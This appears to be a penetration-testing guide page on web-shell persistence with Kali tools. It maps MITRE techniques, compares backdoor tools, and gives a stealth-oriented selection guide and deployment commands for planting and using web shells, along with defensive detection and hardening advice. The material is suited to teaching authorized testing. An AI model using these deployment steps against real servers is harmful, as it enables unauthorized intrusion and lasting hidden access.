---
title: "Phase 05: Persistence"
category: "Kali Linux Penetration Testing"
phase: "05"
topic: "Persistence"
mitre_tactic: "persistence"
mitre_tactic_id: "TA0003"
date: "2026-07-18"
---

# Phase 05: Persistence

## Overview

Persistence is the MITRE ATT&CK tactic (TA0003) focused on maintaining access to compromised systems across restarts, credential changes, and other interruptions. In penetration testing, persistence techniques ensure that an initial foothold survives reboots and administrator interventions, allowing continued access throughout the engagement.

This phase covers tools that establish persistent backdoor access through web server compromise — specifically web shells, backdoor generators, and cookie-based command channels. These tools target PHP, ASP, JSP, and other server-side languages to maintain access to web infrastructure.

## MITRE ATT&CK Mapping

| Technique ID | Technique Name | Description |
|-------------|---------------|-------------|
| T1505.003 | Server Software Component: Web Shell | Backdoor programs deployed through web application vulnerabilities |
| T1546 | Event Triggered Execution | Persistence via web server startup or request-based triggers |
| T1098 | Account Manipulation | Creating or modifying accounts to maintain access |
| T1053 | Scheduled Task/Job | Scheduling backdoor execution for persistence |

## Tools in This Phase

| Tool | Type | Language | Description |
|------|------|----------|-------------|
| **[webacoo](webacoo/webacoo.md)** | Backdoor Generator | Perl/PHP | Cookie-based web backdoor with obfuscation and extension modules |
| **[webshells](webshells/webshells.md)** | Shell Collection | Multi-lang | Pre-written web shells for PHP, ASP, ASPX, CFM, JSP, Perl |
| **[weevely](weevely/weevely.md)** | Weaponized Shell | Python/PHP | Polymorphic PHP agent with 30+ post-exploitation modules |
| **[backdoor-factory](backdoor-factory/)** | Binary Patcher | Python | Injects shellcode into PE/ELF/Mach-O executables |
| **[cymothoa](cymothoa/)** | Process Infector | C | Injects backdoor into running processes |
| **[laudanum](laudanum/)** | Injection Toolkit | Mixed | Collection of injectable web shells and ActiveX controls |
| **[phpggc](phpggc/)** | PHP Exploit | PHP | PHP Generic Gadget Chains for deserialization exploits |

## Web Shell Attack Flow

```text
┌──────────────┐     ┌──────────────────┐     ┌──────────────────┐
│  Vulnerability│────▶│  Upload Webshell │────▶│  Execute Commands│
│  Discovery    │     │  to Target       │     │  via HTTP        │
└──────────────┘     └──────────────────┘     └──────────────────┘
                                                                        │
┌──────────────┐     ┌──────────────────┐     ┌──────────────────┐      │
│  Maintain     │◀────│  Establish C2    │◀────│  Fingerprint     │◀─────┘
│  Persistence  │     │  Channel         │     │  Target OS/Lang  │
└──────────────┘     └──────────────────┘     └──────────────────┘
```

## Tool Selection Guide

| Scenario | Recommended Tool | Why |
|----------|-----------------|-----|
| PHP server, need modular access | **weevely** | 30+ modules, polymorphic agent, session recovery |
| Quick one-liner backdoor | **webshells** (simple-backdoor.php) | Minimal, instant deployment |
| Cookie-based stealth channel | **webacoo** | Commands hidden in HTTP cookies |
| Multi-language target | **webshells** | PHP, ASP, ASPX, CFM, JSP, Perl coverage |
| IIS/Windows web server | **webshells** (cmdasp) | ASP/ASPX shells for IIS |
| Java/Tomcat server | **webshells** (cmdjsp.jsp) | JSP shell for Java containers |
| Network pivoting through web server | **weevely** | `:net_proxy` module for HTTP/SOCKS tunneling |
| Database access through web app | **weevely** | `:sql_console` and `:sql_dump` modules |
| Reverse shell delivery | **webshells** (php-reverse-shell.php) | Pentestmonkey's widely-used reverse shell |
| Minimal detection footprint | **webacoo** with `-r` + `-c` + `-m POST` | Obfuscated, custom cookie, POST-based |

## Prerequisites

Before using persistence tools, ensure:

1. **Authorization:** Written scope agreement permits persistence establishment
2. **Web server access:** Identify the target's server-side language (PHP, ASP, JSP, etc.)
3. **Upload capability:** File upload vulnerability, SCP access, or SQL `INTO OUTFILE`
4. **Network reachability:** The deployed shell must be accessible from your position
5. **Listener infrastructure:** For reverse shells, a listener on your attack machine (e.g., `nc -lvnp 4444`)

## Target Identification

```bash
# Fingerprint web server technology
whatweb http://192.168.1.50/

# Check for PHP
curl -I http://192.168.1.50/index.php | grep -i "x-powered-by"

# Check for ASP.NET
curl -I http://192.168.1.50/ | grep -i "x-aspnet"

# Check for Tomcat/Java
curl -I http://192.168.1.50/ | grep -i "server"

# Enumerate web directories
gobuster dir -u http://192.168.1.50/ -w /usr/share/wordlists/dirb/common.txt
```

## Detection and Defense

### Blue Team Indicators

| Indicator | Detection Method |
|-----------|-----------------|
| Small PHP files in web root | File size audit: `find /var/www -name "*.php" -size -1k` |
| PHP files with `system()`, `exec()` | Content grep: `grep -rn "system\|exec\|passthru" /var/www` |
| Cookie values with Base64 data | WAF/IDS rules on Cookie header entropy |
| Outbound connections from web server | Network monitoring on ports 4444, 8080, 1080 |
| `.htaccess` modifications | File integrity monitoring on `.htaccess` files |
| Web server logs with encoded commands | Log analysis for `cmd=`, `exec=`, Base64 patterns |

### Preventive Controls

```bash
# PHP hardening in php.ini
disable_functions = system,exec,passthru,shell_exec,popen,proc_open,eval,assert
open_basedir = /var/www/html
expose_php = Off
allow_url_include = Off

# File permissions
chmod 755 /var/www/html/
find /var/www/html -name "*.php" -perm /o+w -exec chmod o-w {} \;

# File integrity monitoring
sudo aideinit
sudo aide --check
```

## Engagement Workflow

```text
1. RECONNAISSANCE
   └─ Identify web technology, upload points, existing shells

2. WEBSHELL DEPLOYMENT
   └─ Generate payload → Upload → Verify accessibility

3. COMMAND AND CONTROL
   └─ Connect → Execute reconnaissance → Establish persistence

4. POST-EXPLOITATION
   └─ Privilege escalation → Lateral movement → Data access

5. CLEANUP
   └─ Remove all shells → Restore files → Verify removal → Document
```

## Legal and Ethical Considerations

- **Authorization required:** Web shell deployment constitutes unauthorized access without explicit written permission
- **Scope limitations:** Only deploy persistence within the agreed engagement scope
- **Data handling:** Do not access or exfiltrate data beyond what is necessary for the engagement
- **Cleanup mandate:** All deployed backdoors must be removed at engagement conclusion
- **Documentation:** Record all deployed artifacts, locations, passwords, and session files for the report
- **Chain of custody:** Maintain logs of all actions taken during the persistence phase

## Cross-Phase Dependencies

| Phase | Relationship |
|-------|-------------|
| **[01 Reconnaissance](../01_reconnaissance/)** | Web technology fingerprinting, directory enumeration |
| **[02 Scanning](../02_scanning/)** | Port scanning, service identification, vulnerability scanning |
| **[03 Enumeration](../03_enumeration/)** | Web application enumeration, finding upload points |
| **[04 Vulnerability Analysis](../04_vulnerability_analysis/)** | Identifying upload vulnerabilities, LFI/RFI, SQLi |
| **[06 Privilege Escalation](../06_privilege_escalation/)** | Escalating from web shell to root/admin |
| **[07 Lateral Movement](../07_lateral_movement/)** | Using persistence for network pivoting |

## Common Pitfalls

- **Forgetting cleanup:** Web shells left behind create ongoing security risks and liability
- **No obfuscation:** Deploying un-obfuscated shells is trivially detected by WAF and antivirus
- **Ignoring `disable_functions`:** PHP environments with restricted functions will cause shells to fail silently
- **Wrong language:** Deploying a PHP shell on an ASP server wastes time and leaves traces
- **Missing listener:** Reverse shells fail without an active listener on the attack machine
- **Overwriting legitimate files:** Shell deployment should never modify existing application files
- **Weak passwords:** Simple backdoor passwords are brute-forced by automated scanners
- **No session recovery:** Forgetting that WeBaCoo does not save sessions, unlike Weevely
- **Ignoring HTTPS:** Plain HTTP shells expose credentials to network sniffing

## Post-Engagement Checklist

```text
□ All deployed web shells removed from target filesystem
□ All reverse shell listeners closed
□ Access logs reviewed for engagement traces
□ IP addresses cleaned from logs (if in scope)
□ Session files secured or deleted from attack machine
□ All backdoor passwords documented in the report
□ File integrity baselines restored
□ Target team notified of completion
□ All artifacts (logs, captures, session files) archived securely
```

## Quick Reference: Deployment Commands

```bash
# WeBaCoo: Generate and deploy
webacoo -g -f 2 -o /tmp/shell.php
scp /tmp/shell.php user@192.168.1.50:/var/www/html/images/shell.php
webacoo -t -u http://192.168.1.50/images/shell.php -c "PHPSESSID" -m POST

# Weevely: Generate and deploy
weevely generate T0pS3cr3t /tmp/agent.php
scp /tmp/agent.php user@192.168.1.50:/var/www/html/agent.php
weevely http://192.168.1.50/agent.php T0pS3cr3t

# Webshells: Direct deployment
cp /usr/share/webshells/php/simple-backdoor.php /var/www/html/backdoor.php
curl "http://192.168.1.50/backdoor.php?cmd=whoami"

# Reverse shell listener
nc -lvnp 4444
```

## Resources

- **MITRE ATT&CK Persistence:** https://attack.mitre.org/tactics/TA0003/
- **MITRE ATT&CK Web Shell (T1505.003):** https://attack.mitre.org/techniques/T1505/003/
- **OWASP Testing Guide:** https://owasp.org/www-project-web-security-testing-guide/
- **OffSec PEN-200 Course:** https://www.offsec.com/courses/pen-200/
- **SecLists Web-Shells:** https://github.com/danielmiessler/SecLists/tree/master/Web-Shells
